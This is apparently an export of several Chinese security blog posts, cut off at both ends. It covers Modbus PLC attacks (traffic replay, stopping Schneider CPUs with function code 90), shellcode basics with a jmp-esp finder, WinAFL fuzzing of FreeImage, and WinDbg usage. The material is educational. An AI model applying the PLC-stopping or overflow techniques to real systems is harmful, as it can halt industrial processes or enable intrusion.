vcr与ettercap工具配合使用可以记录modbus协议的流量并进行重放，从而使系统在某段记录下的时间区间内仍表现为正常。\n\n#### Schneider终止cpu运行攻击\n\n![image-20191025184856902](https://tva1.sinaimg.cn/large/006y8mN6ly1g8an2cnpdqj30a204kgmh.jpg)\n\nmodbus中包括了一些未公开的功能码，这些功能码是厂商所使用的专用功能码。其中有一个特别好用的功能码：90（0*5a），对于大多数专有协议而言，必须使用工程软件才能够了解这些协议的工作方式。\n\n使用Unity Pro可以使用功能码90终止CPU的运转，导致逻辑暂停执行，PLC也将停止所有执行功能。\n\n![image-20191025193055598](https://tva1.sinaimg.cn/large/006y8mN6ly1g8aoa168fbj30gq0et0zm.jpg)\n\n#### Schneider功能码90鉴别攻击\n\n![image-20191025193218601](https://tva1.sinaimg.cn/large/006y8mN6ly1g8aobgl4qyj30a5040dgm.jpg)\n\nmodbus nmap脚本通过modbus协议的功能码43和功能码90与设备通信，收集信息帮助建立设备简况（profile），使用设备自带的本地命令可以安全的从设备中提取信息，且不会对设备造成影响。\n\n![image-20191025193638980](https://tva1.sinaimg.cn/large/006y8mN6ly1g8aofzmw1dj30f9074jto.jpg)\n\n### 安全建议\n\n目前，Modbus 系统采取的安全防护措施普遍不足，这里参考信息安全业内研究并结合工控系统自身的安全问题，提出了一些安全建议，能够有效地降低工业控制系统面临的威胁。\n\n**( 1) 从源头开始**\n\n工控网络漏洞，很大一部分是其实现过程出现的漏洞。如果从源头开始控制，从Modbus 系统的需求设计、开发实现、内部测试和部署等阶段，全生命周期的介入安全手段，融入安全设计、安全编码以及安全测试等技术，可以极大地消除安全漏洞，降低整个Modbus 系统的安全风险。\n\n**( 2) 异常行为检测**\n\n异常行为代表着可能发生威胁，不管是有没有攻击者，因此开发针对Modbus 系统的专用异常行为检测设备可以极大提高工控网络的安全性。针对Modbus 系统，首先要分析其存在的各种操作行为，依据“主体，地点，时间，访问方式，操作，客体”等行为描述成一个六元组模型; 进而分析其行为是否属于异常; 最终决定采取记录或者报警等措施。\n\n**( 3) 安全审计**\n\nModbus 的安全审计就是对协议数据进行深度解码分析，记录操作的时间、地点、操作者和操作行为等关键信息，实现对Modbus 系统的安全审计日志记录和审计功能，从而提供安全事件爆发后的时候追查能力。\n\n**( 4) 使用网络安全设备**\n\n使用入侵防御和防火墙等网络安全设备。防火墙是一个串行设备，通过设置，只允许特定的地址访问服务端，禁止外部地址访问Modbus 服务器，可以有效的防止外部入侵; 入侵防御设备可以分析Modbus协议的具体操作内容，有效地检测并阻止来自内部/外部的异常操作和各种渗透攻击行为，对内网提供保护功能。\n\nPS：本篇文章是从多篇文章和论文总结而成，并非原创，只是本人整理，本意是希望对初学Modbus的同学有所帮助。如果涉及到侵权方面的事请私信我，立刻删除。\n\n***本文整理:rye_，转载请注明FreeBuf COM**\n\n***本文由Fstark在rye原文基础上进行了补充完善**\n\n","tags":["工控协议","Modbus"],"categories":["工控"]},{"title":"shellcode回顾（0day2）","url":"/2021/01/25/shellcode/","content":"\n这几个月因为一些原因，工控的事情要先放一放了。现在在做漏洞挖掘的一些事情，其实9月末就将0day2看了不少，可以过了这么长时间又给还回去了。说起来好笑，重新拾起winDbg调试的时候，我是看着9月初自己写的新手教程一步一步又熟悉起来的，所以这一边看的时候还是好好记录一下吧，避免学了又还给老师。\n\n<!-- more -->\n\n### \t什么是shellcode？\n\nshellcode是指缓冲区溢出攻击中植入进程的代码。这个代码是什么都可以，可以是一个恶作剧的弹框，可以是弹出一个系统自带的计算器，也可以是一个木马病毒。\n\n与之相关的还有一个名词exploit，它与shellcode的关系就像是导弹主体与导弹弹头的关系，用0day2中的图片最是生动形象：\n\n![image-20191217163548201](https://tva1.sinaimg.cn/large/006tNbRwly1g9zt1y50cyj31ac0pxag3.jpg)\n\nshellcode是个精细活，也不是直接怼就能怼出来的，至少需要解决以下几个比较关键的问题：\n\n- 从调试器中抄出来的shellcode起始地址下一次就变了，需要想办法让程序能够自动定位到shellcode的起始地址（定位shellcode）\n\n- 缓冲区内除了shellcode，还有一些用于填充的数据，这些数据如何编写\n\n- 不同机器不同操作系统中同一个API函数入口地址往往有差异，需要想办法让shellcode自己运行时动态的获取当前系统API地址\n\n- 部分软件有对缓冲区的限制以及IDS等检查，如何对shellode进行进一步编写使其能绕过\n\n- 在缓存区十分有限的情况下如何尽量让shellcode尺寸更加精炼\n\n  ###定位shellcode\n\n  使用OD直接获取shellcode地址并覆盖返回函数在当时可以执行，但是重新加载后就不一定。\n\n  ![image-20191217170023036](https://tva1.sinaimg.cn/large/006tNbRwly1g9ztrhids5j311y0u01kx.jpg)\n\n根据前人调试程序获取的经验，函数在返回时，ESP所指的位置恰好是溢出淹没的返回地址的下一个位置。，这样我们就可以利用该特性精心构造一个“跳板”。\n\n![image-20191217170754307](https://tva1.sinaimg.cn/large/006tNbRwly1g9ztz80rrfj30m80ngn76.jpg)\n\n这种定位shellcode的方法使用进程空间里一条jmp esp指令作为“跳板”，不论栈帧怎么“移位”，都能够精确地跳回栈区，从而适应程序运行中shellcode内存地址的动态变化。\n\n想要找到ESP的地址，可以使用各种工具中自带的插件，也可以使用以下的c程序。\n\n```c\n#include <windows.h>￼\n#include <stdio.h>￼\n#define DLL_NAME \"user32.dll\"￼\nmain()￼{￼\nBYTE* ptr;￼\nint position,address;￼\nHINSTANCE handle;￼\nBOOL done_flag = FALSE;￼    handle=LoadLibrary(DLL_NAME);￼\nif(!handle)￼\n{￼\n\tprintf(\" load dll erro !\");￼\n  exit(0);￼\n}￼\nptr = (BYTE*)handle;￼\nfor(position = 0; !done_flag; position++)￼\n{￼\n\ttry￼\n  {￼\n  \tif(ptr[position] == 0xFF && ptr[position+1] == 0xE4)￼\n    {￼\n    \t//0xFFE4 is the opcode of jmp esp￼  \n   \t  int address = (int)ptr + position;￼ \n    \tprintf(\"OPCODE found at 0x%x\\n\",address);￼\n    }￼\n  }￼\n  catch(...)￼\n  {￼\n  \tint address = (int)ptr + position;￼\n  \tprintf(\"END OF 0x%x\\n\", address);￼\n  \tdone_flag = true;￼\n  }￼\n }￼\n}\n```\n\n### 缓冲区组成\n\n送入缓冲区的数据可以分为以下几种。\n（1）填充物：可以是任何值，但是一般用NOP指令对应的0x90来填充缓冲区，并把shellcode布置于其后。这样即使不能准确地跳转到shellcode的开始，只要能跳进填充区，处理器最终也能顺序执行到shellcode。\n（2）淹没返回地址的数据：可以是跳转指令的地址、shellcode起始地址，甚至是一个近似的shellcode的地址。\n（3）shellcode：可执行的机器代码。\n在缓冲区中怎样摆放shellcode对exploit的成功至关重要。\n\n![image-20191217172239708](https://tva1.sinaimg.cn/large/006tNbRwly1g9zuel3opqj30m80f6gq8.jpg)\n\n如果缓冲区较大，更推荐把shellcode布置在缓冲区内，有以下好处：\n\n（1）合理利用缓冲区，使攻击串的总长度减小：对于远程攻击，有时所有数据必须包含在一个数据包中！\n（2）对程序破坏小，比较稳定：溢出基本发生在当前栈帧内，不会大范围破坏前栈帧。\n\n","tags":["读书笔记"],"categories":["二进制"]},{"title":"WinAFL小白踩坑指南","url":"/2021/01/25/winafl尝试/","content":"\n本文主要内容包括：WinAFL介绍与安装、以ABC看图程序为例构建Fuzz最小案例库、执行Fuzz跑出Crash，以及最终利用Bugid对Crash分类\n\n<!-- more -->\n\n### WinAFL介绍与安装\n\nWinAFL，是[Ivan Fratric](https://twitter.com/ifsecure)基于[lcumtuf的AFL](http://lcamtuf.coredump.cx/afl/)创建的大型Fuzzing程序，由于[AFL](http://lcamtuf.coredump.cx/afl/) 无法在windows下直接使用，Winafl弥补了这一空白，使用DynamoRIO来插桩&测量代码覆盖率，并使用Windows API进行内存和进程创建。\n\nWinAFL 项目地址：https://github.com/ivanfratric/winafl\n\n请注意：Windows 10 1809及更高版本的最新Windows版本要使用DynamoRIO 8.0.0以上版本\n\n\n\n此时如果直接进行操作可能会出现以下报错\n\n![截屏2020-04-23 上午9.52.25](https://tva1.sinaimg.cn/large/007S8ZIlly1ge6v611hwzj30pp03btbq.jpg)\n\n需要re-compiled ,这个过程为：\n\n(1) 下载安装DynamoRio源码，或者直接下载DynamoRio Windows版的二进制包([https://github.com/DynamoRIO/dynamorio/wiki/Downloads](https://joyceqiqi.wordpress.com/2017/06/02/winafl使用介绍/#))\n\n(2) 打开Visual Studio命令提示工具，如果要安装成64位版本的则打开Visual Studio x64命令提示工具（一般在【开始—所有程序—Visual Stdio—Visual Studio Tools】中可找到）。因为在对64位程序进行fuzz时，需要有64-bit的winafl.dll，所以安装时要选择好版本\n\n(3)在命令提示工具中进入WinAFL的目录下\n\n(4) 在Visual Studio命令提示工具中输入如下命令进行WinAFL编译安装（需将-DDynamoRIO_DIR参数设置为你的DynamoRIO cmake文件所在位置）\n\n32-bit build:\n\n```shell\nmkdir build32\ncd build32\ncmake -G\"Visual Studio 16 2019\" -A Win32 .. -DDynamoRIO_DIR=..\\path\\to\\DynamoRIO\\cmake \ncmake --build . --config Release\n```\n\n64-bit build:\n\n```shell\nmkdir build64\ncd build64\ncmake -G\"Visual Studio 16 2019\" -A x64 .. -DDynamoRIO_DIR=..\\path\\to\\DynamoRIO\\cmake\ncmake --build . --config Release\n```\n\n这里需要注意一下-G选择平台时VS16与之前版本默认目标平台架构是有些区别的：\n\n```shell\ncmake -G \"Visual Studio 16 2019\" -A Win32   ;x32\ncmake -G \"Visual Studio 16 2019\" -A x64     ;x64  默认目标平台名称（架构）为Win64\n\ncmake -G \"Visual Studio 15 2017\"            ;x32  默认目标平台名称（架构）为Win32\ncmake -G \"Visual Studio 15 2017 Win64\"      ;x64\n```\n\nwinafl 命令行参数，主要分为三段,(afl执行参数–dynamoRIO执行参数–程序执行参数)\n\n- afl执行参数主要包括\n  - **-i -o** 指定输入和输出文件夹\n  - **-D** 指定DynamoRIO根目录\n  - **-t**  每一次样本执行的超时时限\n  - **-f** fuzz 程序读取的位置\n  - **-M \\\\ -S** 分布式模式\n  - **-x** 可选的fuzz字典\n- dynamRIO执行参数主要包括\n  - **-coverage_module** 计算覆盖率的模块\n  - **-fuzz_iterations** 在重新启动目标进程之前，目标函数要运行的最大迭代次数。\n  - **-target_module** 包含目标函数的模块(一个可执行文件镜像)需要与该选项一起指定-target_method或-target_offset\n  - **-target_method** 目标函数，需要export或者带符号\n  - **-target_offset** 目标偏移，相对于target_module的偏移，在method无法导出的时候使用\n  - **-nargs** 程序执行所需要的参数个数\n  - **-debug** 调试模式。不要尝试连接到服务器。输出包含已加载模块，打开的文件和覆盖率信息的日志文件\n  - **-logdir** 指定将日志文件写入哪个目录（仅与-debug一起使用）\n- 程序执行参数\n  就是要fuzz的程序的命令行\n\n### 构建Fuzz最小案例库\n\n现在我们从网上搜集一堆ABC看图支持的格式，包括tif、jpg、png、ico等，github上有许多Fuzz的案例库，这样的案例库中包含大量的文件，运行起来效率会很差。根据学长博客，AFL是存在语料库蒸馏（Corpus Distillation）工具的，afl-cmin和afl-tmin。\n\n1. 移除执行相同代码的输入文件——AFL-CMIN\n   afl-cmin的核心思想是：尝试找到与语料库全集具有相同覆盖范围的最小子集。举个例子：假设有多个文件，都覆盖了相同的代码，那么就丢掉多余的文件。\n2. 减小单个输入文件的大小——AFL-TMIN\n   整体的大小得到了改善，接下来还要对每个文件进行更细化的处理。afl-tmin尽量缩减文件体积。\n\n在winafl中，他们存在于 winafl-cmin.py，对输入的样本文件进行最小化处理，以用来提高 WinAFL 的执行效率。\n\n筛选命令\n\n```python\npython winafl-cmin.py --working-dir C:\\Users\\test\\Desktop\\winafl-master\\build32\\bin\\Release -D C:\\Users\\test\\Desktop\\DynamoRIO-Windows-8.0.0-1\\bin32 -t 100000 -i C:\\Users\\test\\Desktop\\jpg -o C:\\Users\\test\\Desktop\\jpg\\out -coverage_module FreeImage.dll -target_module Project1.exe -target_method main -nargs 2 -- C:\\Users\\test\\source\\repos\\Project1\\Release\\Project1.exe @@\n```\n\n此时可能出现[!] Dry-run failed, 2 executions resulted differently:Tuples matching? False的报错\n\n![截屏2020-04-24 下午6.00.34](https://tva1.sinaimg.cn/large/007S8ZIlly1ge6ywxmm5cj30p206iq5z.jpg)\n\n看来测试用例中存在一些坏的用例，导致不能正确精简，在语料库所在文件夹可以利用以下bash脚本简单判断一下\n\n```bash\nλ for file in *; do printf \"==== FILE: $file =====\\n\";/c/Users/test/source/repos/Project1/Release/Project1.exe $file ;echo $?; done\n```\n\n正常运行的文件返回值都是0，有问题的文件返回结果都不太正常\n\n![image-20200426113452542](https://tva1.sinaimg.cn/large/007S8ZIlly1ge70jesh5mj30h80at422.jpg)\n\n把这些返回结果不太正常的删除之后，再运行一次语料库蒸馏，发现运行成功了\n\n![截屏2020-04-24 下午6.51.49的副本](https://tva1.sinaimg.cn/large/007S8ZIlly1ge70lh6yrlj30z60ak0xi.jpg)\n\n可以看到原本429张被精简到了148张，确实少了不少，根据参考教程中的提示，Winafl在处理大于4Kb的图片时，速度会变得很慢，因此再删除一波，最终语料库就剩下这么点了。\n\n![image-20200426114211822](https://tva1.sinaimg.cn/large/007S8ZIlly1ge70r1i5iaj31cj0lwqrn.jpg)\n\n\n\n### 开始运行\n\n经过动态和静态的简单分析后，发现ABC看图主要调用Freeimage.dll进行图片解析的，决定对 FreeImage 库的载入函数进行模糊测试，针对 FreeImage_LoadU 函数编写测试程序\n\n```c++\n#define _CRT_SECURE_NO_WARNINGS\n#include <windows.h> \n#include <tchar.h>\n#include <iostream>\nusing namespace std;\n\nextern \"C\" __declspec(dllexport) int main(int argc, char** argv);\nvoid test(HINSTANCE hinstLib, wchar_t* PathName);\nwchar_t* charToWChar(const char* text);\n\ntypedef DWORD(__stdcall* FreeImage_GetFileTypeU)(const wchar_t* lpszPathName, int flag);\ntypedef DWORD(__stdcall* FreeImage_Initialise)(BOOL load_local_plugins_only);\ntypedef DWORD(__stdcall* FreeImage_DeInitialise)();\ntypedef DWORD(__stdcall* FreeImage_LoadU)(DWORD format, const wchar_t* lpszPathName, int flag);\ntypedef DWORD(__stdcall* FreeImage_UnLoad)(DWORD dib);\n\nFreeImage_Initialise Initialise;\nFreeImage_GetFileTypeU LoadFileType;\nFreeImage_LoadU LoadU; DWORD load;\nFreeImage_UnLoad UnLoad;\nFreeImage_DeInitialise DeInitialise;\n\nint main(int argc, char** argv)\n{\n\tif (argc < 2) {\n\t\tprintf(\"Usage: %s < file>\\n\", argv[0]);\n\t\treturn 0;\n\t}\n\n\twchar_t* PathName = charToWChar(argv[1]);\n\n\tHINSTANCE hinstLib; BOOL fFreeResult, fRunTimeLinkSuccess = FALSE; DWORD Error = NULL;\n\thinstLib = LoadLibrary(TEXT(\"C:\\\\FreeImage.dll\"));\n\n\tif (hinstLib != NULL)\n\t{\n\t\tfRunTimeLinkSuccess = TRUE;\n\n\t\tInitialise = (FreeImage_Initialise)GetProcAddress(hinstLib, (LPCSTR)163); // 初始化 FreeImage 库\n\t\tLoadFileType = (FreeImage_GetFileTypeU)GetProcAddress(hinstLib, (LPCSTR)126);// 获取位图文件类型\n\t\tLoadU = (FreeImage_LoadU)GetProcAddress(hinstLib, (LPCSTR)181);\t// 加载位图\n\t\tUnLoad = (FreeImage_UnLoad)GetProcAddress(hinstLib, (LPCSTR)242);// 卸载位图\n\t\tDeInitialise = (FreeImage_DeInitialise)GetProcAddress(hinstLib, (LPCSTR)83);//卸载 FreeImage 库\n\n\t\ttest(hinstLib, PathName);\n\t\tfFreeResult = FreeLibrary(hinstLib);\n\t}\n\n\tif (!fRunTimeLinkSuccess)\n\t\tcout << \"加载函数失败, Error: \" << Error << endl;\n\treturn 0;\n}\n\nvoid test(HINSTANCE hinstLib, wchar_t* PathName)\n{\n\t\n\tDWORD FileType = (LoadFileType)(PathName, 0);\n\tload = (LoadU)(FileType, PathName, 0);\n\treturn;\n\n}\n\nwchar_t* charToWChar(const char* text)\n{\n\tsize_t size = strlen(text) + 1;\n\twchar_t* wa = new wchar_t[size];\n\tmbstowcs(wa, text, size);\n\treturn wa;\n}\n```\n\n在对该程序进行编译之后，可以先简单测试一下WinAFL 是否可以正常使用。-debug 表示设置为调试模式。\n\n```shell\n\\winafl\\bin32> C:\\Users\\test\\Desktop\\DynamoRIO-Windows-8.0.0-1\\bin32\\drrun.exe -c winafl.dll -debug -coverage_module FreeImage.dll -target_module Project1.exe -target_method main -fuzz_iterations 10 -nargs 2 -- C:\\Users\\test\\source\\repos\\Project1\\Debug\\Project1.exe C:\\Users\\test\\Desktop\\jpg\\1x1-low.jpg\n```\n\n如下图所示，日志文件当中模块加载正常并没有错误显示\n\n![image-20200426120155981](https://tva1.sinaimg.cn/large/007S8ZIlly1ge71bk08znj30u80htk1b.jpg)\n\n下面就要开始模糊测试了，按照教程进行的，但是它的目标函数是main，我们来看看结果如何。\n\n```shell\nafl-fuzz.exe -i C:\\Users\\test\\Desktop\\jpg\\out -o C:\\Users\\test\\Desktop\\jpg\\re -D C:\\Users\\test\\Desktop\\DynamoRIO-Windows-8.0.0-1\\bin32 -t 9000 -- -coverage_module FreeImage.dll -target_module Project1.exe -target_method main -fuzz_iterations 5000 -nargs 2 -- C:\\Users\\test\\source\\repos\\Project1\\Debug\\Project1.exe @@\n```\n\n![截屏2020-04-23 下午5.17.24](https://tva1.sinaimg.cn/large/007S8ZIlly1ge71f0ipmzj30lq0kvn4l.jpg)\n\n如图所示，可以跑是可以跑，但是这个速度实在太慢了，执行main函数浪费了太多时间，实际上我们的load函数只测test函数就可以，我们将-target_method改为test尝试一下\n\n```shell\nafl-fuzz.exe -i C:\\Users\\test\\Desktop\\jpg\\out -o C:\\Users\\test\\Desktop\\jpg\\re -D C:\\Users\\test\\Desktop\\DynamoRIO-Windows-8.0.0-1\\bin32 -t 9000 -- -coverage_module FreeImage.dll -target_module Project1.exe -target_method test -fuzz_iterations 5000 -nargs 2 -- C:\\Users\\test\\source\\repos\\Project1\\Debug\\Project1.exe @@\n```\n\n![1587641858789_8DC06F32-53EE-4A64-8FD1-45907DC9CF93](https://tva1.sinaimg.cn/large/007S8ZIlly1ge71j4kjn3j30hd079jsl.jpg)\n\n然后就蹦框了，看起来是没有找到我们写的test函数，忘了在vs里把test函数也导出\n\n![image-20200426121116517](https://tva1.sinaimg.cn/large/007S8ZIlly1ge71lacv24j30i90200tk.jpg)\n\n这里导出后再编译一遍，再尝试一下，成功了，这速度明显提升了好几倍啊\n\n![image-20200426121601823](https://tva1.sinaimg.cn/large/007S8ZIlly1ge71q85ybaj30ko0bkn57.jpg)\n\n为了让fuzz效率更高一点，充分利用cpu的多核，进行多核系统的并行测试\n\n```shell\nafl-fuzz.exe -i C:\\Users\\test\\Desktop\\jpg\\out -o C:\\Users\\test\\Desktop\\jpg\\re -M master -D C:\\Users\\test\\Desktop\\DynamoRIO-Windows-8.0.0-1\\bin32 -t 9000 -- -coverage_module FreeImage.dll -target_module Project1.exe -target_method test -fuzz_iterations 5000 -nargs 2 -- C:\\Users\\test\\source\\repos\\Project1\\Debug\\Project1.exe @@\n\nafl-fuzz.exe -i C:\\Users\\test\\Desktop\\jpg\\out -o C:\\Users\\test\\Desktop\\jpg\\re -S slaver01 -D C:\\Users\\test\\Desktop\\DynamoRIO-Windows-8.0.0-1\\bin32 -t 9000 -- -coverage_module FreeImage.dll -target_module Project1.exe -target_method test -fuzz_iterations 5000 -nargs 2 -- C:\\Users\\test\\source\\repos\\Project1\\Debug\\Project1.exe @@\n\nafl-fuzz.exe -i C:\\Users\\test\\Desktop\\jpg\\out -o C:\\Users\\test\\Desktop\\jpg\\re -S slaver02 -D C:\\Users\\test\\Desktop\\DynamoRIO-Windows-8.0.0-1\\bin32 -t 9000 -- -coverage_module FreeImage.dll -target_module Project1.exe -target_method test -fuzz_iterations 5000 -nargs 2 -- C:\\Users\\test\\source\\repos\\Project1\\Debug\\Project1.exe @@\n```\n\n因为我的配置比较垃圾只有四核，所以就开这么多了😂核多的朋友请自行往上添加，挂了一个晚上跑出来了不少的crash，我们先试一下\n\n![image-20200426122130582](https://tva1.sinaimg.cn/large/007S8ZIlly1ge71vxdm8lj30dx08pn0e.jpg)\n\n扔到ABC看图里，发现真的崩溃了\n\n![截屏2020-04-25 上午8.07.03](https://tva1.sinaimg.cn/large/007S8ZIlly1ge71wm6ez1j30x80mfaec.jpg)\n\n\n\n### 利用Bugid对Crash分类\n\n这样一堆crash，里面肯定有不少重复的，原因也有各不相同，如何对他们进行快速分类并找到问题点呢？\n\n在这里我使用了BugID，它可以反馈崩溃和死机的可利用性的详细报告，BugID安装所需要的环境如下：\n\n- 最新的[Python 2.7.14](https://www.python.org/downloads/release/python-2715/)\n- [Windows的](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/)最新[调试工具](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/)\n- 最新的[BugId版本](https://github.com/SkyLined/BugId/releases)\n\n如果使用默认设置安装Windows的Python和调试工具，则BugId应该能够运行而无需调整任何设置。您可以在本地文件系统上任意位置解压缩BugId\n\n但是理论上BugID需要一个一个进行文件分析，而Crash这么多，只是就可以写一个Python脚本来帮助我们\n\n```python\nimport sys\nimport os\n\nsys.path.append(r\"C:\\Users\\test\\Desktop\\BugId-master\")\ntestcases = []\n\nfor root, dirs, files in os.walk(r\"C:\\Users\\test\\Desktop\\jpg\\re\\slaver01\\crashes\", topdown=False):\n    for name in files:\n        testcase =  os.path.abspath(os.path.join(root, name))\n        testcases.append(testcase)\n\nfor testcase in testcases:\n    print (\"[*] Gonna run: \", testcase)\n    os.system(r'PageHeap.cmd \"Project1.exe\" ON')\n    os.system(r'python C:\\Users\\test\\Desktop\\BugId-master\\BugId.py C:\\Users\\test\\source\\repos\\Project1\\Debug\\Project1.exe --isa= x86 -- %s' % testcase)\n```\n\n请注意在最后的程序后面加上--isa= x86哦，不加默认作为64位调试会报错\n\n运行脚本之后，我们就看到源源不断的bug信息出来了\n\n![image-20200426123621956](https://tva1.sinaimg.cn/large/007S8ZIlly1ge72be2rxoj31bn0jw4ok.jpg)\n\n最后可以写到一个文档里保存下来，看起来字符好像有点问题，不过问题不大\n\n![image-20200426123837430](https://tva1.sinaimg.cn/large/007S8ZIlly1ge72dqh0v9j30th0epgve.jpg)\n\n这只是简要信息，BugID在运行时已经自动生成了较为详细的分析报告，打开BugID目录就可以看到\n\n![image-20200426124040834](https://tva1.sinaimg.cn/large/007S8ZIlly1ge72fvy3s9j30gd05sn04.jpg)\n\n随便打开一个看看，很详细\n\n![image-20200426124141616](https://tva1.sinaimg.cn/large/007S8ZIlly1ge72gxjnipj30w00hkwow.jpg)\n\n想看哪个选项点开就好了\n\n![image-20200426124230545](https://tva1.sinaimg.cn/large/007S8ZIlly1ge72hrzcvdj30xn0kqagv.jpg)\n\n### 参考文献\n\nwinafl使用 http://www.simp1e.site/2020/04/18/winafl/\n\n模糊测试工具WinAFL使用指南 https://www.freebuf.com/articles/system/216437.html\n\n初识 Fuzzing 工具 WinAFL https://paper.seebug.org/323/\n\nFuzz 工具 WinAFL 的使用感受 https://bbs.pediy.com/thread-255162.htm\n\nFuzzing the MSXML6 library with WinAFL https://symeonp.github.io/2017/09/17/fuzzing-winafl.html\n\n","tags":["漏洞挖掘","Fuzzing","BugID","AFL"],"categories":["二进制"]},{"title":"WinDbg初步学习总结与简单实战","url":"/2021/01/25/WinDbg/","content":"\n### WinDbg核心功能介绍\n\nWinDbg是在windows平台下，强大的用户态和内核态调试工具。它能够通过dmp文件轻松的定位到问题根源，可用于分析蓝屏、程序崩溃（IE崩溃）原因，是我们日常工作中必不可少的一个有力工具，学会使用它，将有效提升我们的问题解决效率和准确率。\n\n<!-- more -->\n\n###  WinDbg加载自编译HelloWorld程序\n\n本部分使用的helloworld源程序与之前相比没有改动，唯一需要注意的是在使用visual c++生成文件时需要生成.pdb文件,它是该应用程序相应的符号文件，若没有它调试将变得十分困难。\n\n打开windbg，点击：File->Open Executable，选中编译好的helloworld.exe文件。随后我们使用lm命令查看一下加载了那些模块。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753vsdxmaj30wr06uq3k.jpg) \n\n我们想要运行到HelloWorld.exe的main函数中停下，可以使用!dh -a helloworld命令，用来在所有头部文件中搜索helloworld关键词，需要注意的是这里呈现的地址结果是相对虚拟地址（RVA），并非真实地址。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753vwi9jfj30zk0igdjn.jpg) \n\n \n\n从图中可得它的想对虚拟地址为0x3510，由开始lm命令中可知，helloworld模块的起始地址为0x00400000，这两个十六进制相加结果为0x403510，此即为main函数真实地址，我们使用bp命令在该处进行断点，bl可以看到断点的详情。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753w084alj30yg0a43yj.jpg) \n\n随后使用g命令运行，成功命中0号断点\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753w3mgeoj30yg08c0so.jpg) \n\n此时对应的Disassembly窗口显示如下图所示\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753w6tj0ej31060dqwer.jpg) \n\n此时即为helloworld入口点main处。事实上还有另一种更为轻松的方式来寻找入口点main，我们在windbg的命令行中直接输入bp main，让其自行判断main的位置并设置断点，但是断的位置可能并不十分精准，mainCRTStartup才是真正的程序入口点。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753wb03h8j319407waa9.jpg) \n\n###  WinDbg分析真实程序\n\n下面我们以windows自带的记事本为例进行简单调试。首先打开WinDbg，在\"文件\" 菜单上, 选择 \"打开可执行文件\"。 在 \"打开可执行文件\" 对话框中, 导航到包含 notepad.exe 的文件夹 (例如, C:\\Windows\\System32)。 对于 \"文件名\", 请输入 notepad.exe。 单击“打开” 。\n\n \n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753wh4010j30j40ekwiw.jpg) \n\n此时若要查看Notepad.exe各个模块的符号，可以输入该命令：[x notepad!*](https://go.microsoft.com/fwlink/p?linkid=399240)\n\n随后将会看到结果的输出。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753wlfpr2j30k00bu0vr.jpg) \n\n若要查看Notepad.exe 模块中包含 main 的符号, 可以命令：[x notepad!*main*](https://go.microsoft.com/fwlink/p?linkid=399240)\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753wp1s8fj30lu03yq3l.jpg) \n\n在记事本上设置断点notepad!WinMain，输入以下命令：[bu notepad!WinMain](http://go.microsoft.com/fwlink/p?linkid=399390)\n\n要验证是否设置了断点，请输入以下命令：[bl](http://go.microsoft.com/fwlink/p?linkid=399391)\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753wsbf0cj30ls03edg0.jpg) \n\n运行，请输入以下命令：[g](http://go.microsoft.com/fwlink/p?linkid=399388)\n\n记事本一直运行到winmain函数，然后中断到调试器。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753ww2ju9j30ks02y0ta.jpg) \n\n此时要查看在记事本进程中加载的代码模块列表，请输入以下命令：[lm](http://go.microsoft.com/fwlink/p?linkid=399237)\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753x0a7gkj30g809e74t.jpg) \n\n要查看堆栈跟踪，请输入以下命令：[k](http://go.microsoft.com/fwlink/p?linkid=399389)\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753x41aupj30mm040t96.jpg) \n\n再次运行 [g](http://go.microsoft.com/fwlink/p?linkid=399388)，要中断记事本执行，请从“调试”菜单中选择“中断”。\n\n观察保存过程，要在zwwritefile处设置和验证断点，请输入以下命令：[bu ntdll!ZwWriteFile](http://go.microsoft.com/fwlink/p?linkid=399390)和[bl](http://go.microsoft.com/fwlink/p?linkid=399391)。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753x8q76aj30dw020jrk.jpg) \n\n输入g重新开始运行记事本。在记事本窗口中，输入一些文本，然后从“文件”菜单中选择“保存”。当涉及zwCreateFile时，正在运行的代码将中断。输入k以查看堆栈跟踪。\n\n \n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753xcxf6gj319y0jg74o.jpg) \n\n在windbg窗口的命令行左侧，注意处理器和线程号。在本例中，当前处理器编号为0，当前线程编号为2。因此，我们正在查看线程2的堆栈跟踪（它恰好运行在处理器0上）。要查看记事本进程中所有线程的列表，请输入以下命令：~\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753xh4ztxj30n402adg1.jpg) \n\n要查看线程0的堆栈跟踪，请输入以下命令：～0s，并输入k查看详情。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g753xp2vz4j318i0me3yx.jpg) \n\n要退出调试并从记事本进程中分离，请输入以下命令： [qd](http://go.microsoft.com/fwlink/p?linkid=399394)，则本次调试结束记事本程序关闭。\n\n###  WinDbg常用命令总结\n\n| **命令** | **含义**               | **说明**                    |\n| -------- | ---------------------- | --------------------------- |\n| p        | Step                   | 单步步过                    |\n| t        | Trace                  | 单步步入                    |\n| pa       | Step to Address        | 单步到指定地址 不进入子函数 |\n| ta       | Trace to Address       | 追踪到指定地址 进入子函数   |\n| pc       | Step to Next Call      | 单步执行到下一个函数调用    |\n| tc       | Trace to Next Call     | 追踪执行到下一个函数调用    |\n| tb       | Trace to Next Branch   | 追踪到下一条分支指令        |\n| g        | Go                     | 恢复运行                    |\n| gu       | Go Up                  | 执行到函数返回              |\n| q        | Quit                   | 停止调试                    |\n| .detach  | detach                 | 分离调试器                  |\n| bp       | 设置软件断点           | 无                          |\n| bu       | 对未加载的模块设置断点 | 无                          |\n| bm       | 批量设置断点           | 无                          |\n| ba       | 设置硬件断点           | 无                          |\n| bl       | 列出所有断点           | 无                          |\n| bc       | 删除断点               | 无                          |\n| bd       | 禁止断点               | 无                          |\n| be       | 启用断点               | 无                          |\n| !address | 